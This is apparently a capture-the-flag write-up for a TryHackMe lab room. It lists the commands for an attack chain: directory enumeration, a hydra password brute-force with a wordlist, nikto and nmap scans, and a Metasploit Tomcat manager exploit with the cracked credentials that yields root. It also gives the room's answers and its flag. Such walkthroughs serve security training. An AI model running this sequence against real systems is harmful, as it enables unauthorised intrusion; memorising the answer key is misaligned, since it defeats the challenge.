# Tools Rus

[Tools Rus](https://tryhackme.com/room/toolsrus)

## Summary

1. `dirb` and `dirbuster` interchangeable
2. `hydra` for brute forcing passwords
3. `nikto` for testing against web services

## Solutions

1. ToysRus

   1. `dirb <IP:PORT>` -> `guidelines`
   2. Go to `IP/guidelines` -> `bob`
   3. Dir with code 401 -> `protected`
   4. `hydra -l bob -P /usr/share/wordlists/rockyou.txt.gz 10.10.86.208 http-get /protected` -> `bubbles`
   5. `nmap -A <IP>` -> `1234`
   6. `Apache Tomcat/7.0.88`
   7. `nikto -port 1234 -host 10.10.86.208 -root /manager/html -id bob:bubbles -output ./nikto_report1234.txt`; `grep -n documentation ./nikto_report1234.txt` -> `5`
   8. `nikto -port 80 -host 10.10.86.208 -root . -output ./nikto_report80.txt` -> `Apache/2.4.18`
   9. nmap result -> `1.1`
   10. Metasploit
       1. `msfdb init`
       2. `msfconsole`
       3. `search CVE-2009-3548`
       4. `use 2`
       5. `show options`
       6. `set RHOSTS 10.10.86.208`
       7. `set RPORT 1234`
       8. `set HttpUsername bob`
       9. `set HttpPassword bubbles`
       10. `run`
       11. `getuid` -> `root`
   11. `cat /root/flag.txt` -> `ff1fc4a81affcc7688cf89ae7dc6e0e1`
